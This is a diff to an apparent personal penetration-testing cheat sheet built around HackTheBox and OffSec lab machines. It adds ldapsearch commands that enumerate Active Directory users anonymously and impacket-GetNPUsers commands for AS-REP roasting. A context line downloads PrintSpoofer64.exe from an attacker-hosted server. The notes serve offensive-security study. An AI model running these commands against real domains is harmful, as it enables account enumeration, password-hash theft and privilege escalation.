@@ -1155,8 +1155,13 @@ In computer networking, the Name/Finger protocol and the Finger user information
 - If want login with ldap ports 389, 636, 3268, 3269 anonymously login get details like usernames and passwords
 
 ```powershell
-# ldap Aonnymous login ports 389, 636, 3268, 3269 hutch PG Practice
-ldapsearch -x -H ldap://192.168.104.122 -D '' -w '' -b "DC=hutch,DC=offsec"
+# ldap Aonnymous login ports 389, 636, 3268, 3269 
+ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts #Forest HTB
+ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local"
+ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)'
+ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName # Users with persons also check the users in rpcclient here missing of service accounts
+ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName  # Filter then user for any bruteforce
+ldapsearch -x -H ldap://192.168.104.122 -D '' -w '' -b "DC=hutch,DC=offsec" #hutch PG Practice
 nxc ldap 192.168.104.122 -u '' -p '' -M get-desc-users # Get users information if it has anonymous login
 
 
@@ -2852,9 +2857,13 @@ iwr -uri http://IP:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 ```
 
 ### AS-REP Roasting
+- If you have list of users not passwords or don't know usernames and passwords can try the <b>impacket-GetNPUsers</b> to get user hash then move forward
 - In Windows Active Directory, You have AD list of users but don't have password we can try the Impacket-GetNPUsers (Blackfield-HackTheBox)
 
 ```powershell
+impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/' # Forest HackTheBox
+impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/svc-alfresco' # It will prompt for password press enter you'll get hash
+
 #List of Users no password (Blackfield-HackTheBox)
 impacket-GetNPUsers -dc-ip <IP> -no-pass -usersfile users.lst blackfield/  
 impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
